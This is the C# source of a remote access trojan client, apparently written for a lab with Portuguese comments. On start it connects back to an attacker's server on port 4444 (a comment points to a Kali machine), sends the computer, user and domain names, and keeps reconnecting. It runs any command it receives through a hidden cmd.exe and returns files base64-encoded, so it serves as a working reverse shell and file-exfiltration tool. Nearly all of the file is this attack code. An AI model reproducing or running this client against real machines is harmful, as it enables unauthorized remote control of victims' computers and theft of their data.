using System;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;

namespace RATLab
{
    public class RATClientForm : Form
    {
        private TextBox logTextBox;
        private TcpClient client;
        private NetworkStream stream;
        private Thread connectionThread;
        private bool isRunning = true;

        // Configurações do servidor
        private string serverIP = "0.0.0.0"; // ALTERE PARA O IP DO SEU KALI
        private int serverPort = 4444;
        private int reconnectDelay = 5000; // 5 segundos

        public RATClientForm()
        {
            InitializeUI();
            LogMessage("=== RAT Client Iniciado ===");
            LogMessage($"Servidor configurado: {serverIP}:{serverPort}");

            // Inicia thread de conexão
            connectionThread = new Thread(ConnectionLoop);
            connectionThread.IsBackground = true;
            connectionThread.Start();
        }

        private void InitializeUI()
        {
            this.Text = "RAT Client - Log de Atividades";
            this.Size = new Size(800, 600);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormClosing += OnFormClosing;

            logTextBox = new TextBox
            {
                Multiline = true,
                Dock = DockStyle.Fill,
                ScrollBars = ScrollBars.Vertical,
                ReadOnly = true,
                BackColor = Color.Black,
                ForeColor = Color.LimeGreen,
                Font = new Font("Consolas", 10)
            };

            this.Controls.Add(logTextBox);
        }

        private void LogMessage(string message)
        {
            if (logTextBox.InvokeRequired)
            {
                logTextBox.Invoke(new Action(() => LogMessage(message)));
                return;
            }

            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            logTextBox.AppendText($"[{timestamp}] {message}\r\n");
        }

        private void ConnectionLoop()
        {
            while (isRunning)
            {
                try
                {
                    LogMessage($"Tentando conectar ao servidor {serverIP}:{serverPort}...");

                    client = new TcpClient();
                    client.Connect(serverIP, serverPort);
                    stream = client.GetStream();

                    LogMessage("cCONECTADO ao servidor com sucesso!");

                    // Envia informações do sistema
                    SendSystemInfo();

                    // Loop de recebimento de comandos
                    byte[] buffer = new byte[4096];
                    while (isRunning && client.Connected)
                    {
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead == 0) break;

                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                        LogMessage($"← Comando recebido: {command}");

                        ProcessCommand(command);
                    }

                    LogMessage("✗ Conexão encerrada pelo servidor");
                }
                catch (SocketException ex)
                {
                    LogMessage($"✗ Falha na conexão: {ex.Message}");
                }
                catch (Exception ex)
                {
                    LogMessage($"✗ Erro: {ex.Message}");
                }
                finally
                {
                    CloseConnection();

                    if (isRunning)
                    {
                        LogMessage($"Aguardando {reconnectDelay / 1000} segundos para reconectar...");
                        Thread.Sleep(reconnectDelay);
                    }
                }
            }
        }

        private void SendSystemInfo()
        {
            try
            {
                string info = $"SYSTEM_INFO|" +
                              $"Computer: {Environment.MachineName}|" +
                              $"User: {Environment.UserName}|" +
                              $"OS: {Environment.OSVersion}|" +
                              $"Domain: {Environment.UserDomainName}";
                SendResponse(info);
                LogMessage("→ Informações do sistema enviadas");
            }
            catch (Exception ex)
            {
                LogMessage($"Erro ao enviar informações: {ex.Message}");
            }
        }

        private void ProcessCommand(string command)
        {
            try
            {
                string response = "";

                if (command.ToLower().StartsWith("cmd "))
                {
                    string cmdCommand = command.Substring(4);
                    LogMessage($"→ Executando comando do sistema: {cmdCommand}");
                    response = ExecuteCommand(cmdCommand);
                }
                else if (command.ToLower() == "sysinfo")
                {
                    LogMessage("→ Coletando informações do sistema");
                    response = GetSystemInfo();
                }
                else if (command.ToLower().StartsWith("download "))
                {
                    string filePath = command.Substring(9);
                    LogMessage($"→ Tentando baixar arquivo: {filePath}");
                    response = DownloadFile(filePath);
                }
                else if (command.ToLower().StartsWith("cd "))
                {
                    string path = command.Substring(3).Trim();
                    response = ChangeDirectory(path);
                }
                else if (command.ToLower() == "screenshot")
                {
                    LogMessage("→ Capturando screenshot");
                    response = "Screenshot não implementado nesta versão de demonstração, pois iria demorar muito, mas caso queiram implementar para testes, fiquem a vontade :D";
                }
                else
                {
                    // Tenta executar o comando diretamente no sistema operacional
                    LogMessage($"→ Tentando executar comando do sistema: {command}");
                    response = ExecuteCommand(command);
                }

                SendResponse(response);
                LogMessage($"→ Resposta enviada ({response.Length} bytes)");
            }
            catch (Exception ex)
            {
                LogMessage($"Erro ao processar comando: {ex.Message}");
                SendResponse($"ERRO: {ex.Message}");
            }
        }

        private string ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    return string.IsNullOrEmpty(error) ? output : $"OUTPUT:\n{output}\nERROR:\n{error}";
                }
            }
            catch (Exception ex)
            {
                return $"Erro ao executar comando: {ex.Message}";
            }
        }

        private string GetSystemInfo()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== INFORMAÇÕES DO SISTEMA ===");
            sb.AppendLine($"Nome do Computador: {Environment.MachineName}");
            sb.AppendLine($"Usuário: {Environment.UserName}");
            sb.AppendLine($"Domínio: {Environment.UserDomainName}");
            sb.AppendLine($"Sistema Operacional: {Environment.OSVersion}");
            sb.AppendLine($"Versão .NET: {Environment.Version}");
            sb.AppendLine($"Processadores: {Environment.ProcessorCount}");
            sb.AppendLine($"Diretório Atual: {Environment.CurrentDirectory}");
            sb.AppendLine($"Tempo de Atividade: {TimeSpan.FromMilliseconds(Environment.TickCount)}");
            return sb.ToString();
        }

        private string DownloadFile(string filePath)
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    return $"Arquivo não encontrado: {filePath}";
                }

                byte[] fileData = File.ReadAllBytes(filePath);
                string base64 = Convert.ToBase64String(fileData);
                return $"FILE_DATA|{Path.GetFileName(filePath)}|{base64}";
            }
            catch (Exception ex)
            {
                return $"Erro ao ler arquivo: {ex.Message}";
            }
        }

        private string ChangeDirectory(string path)
        {
            try
            {
                // Usa a função do .NET para mudar o diretório de trabalho do aplicativo
                Directory.SetCurrentDirectory(path);

                string newDir = Directory.GetCurrentDirectory();
                LogMessage($"→ Diretório de trabalho alterado para: {newDir}");
                return $"Diretório alterado para: {newDir}";
            }
            catch (Exception ex)
            {
                LogMessage($"Erro ao mudar diretório: {ex.Message}");
                return $"ERRO: Não foi possível mudar para o diretório '{path}'. {ex.Message}";
            }
        }

        private void SendResponse(string response)
        {
            try
            {
                if (stream != null && client.Connected)
                {
                    byte[] data = Encoding.UTF8.GetBytes(response + "\n");
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                }
            }
            catch (Exception ex)
            {
                LogMessage($"Erro ao enviar resposta: {ex.Message}");
            }
        }

        private void CloseConnection()
        {
            try
            {
                stream?.Close();
                client?.Close();
            }
            catch { }
        }

        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            isRunning = false;
            CloseConnection();
            connectionThread?.Join(1000);
        }

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new RATClientForm());
        }
    }
}
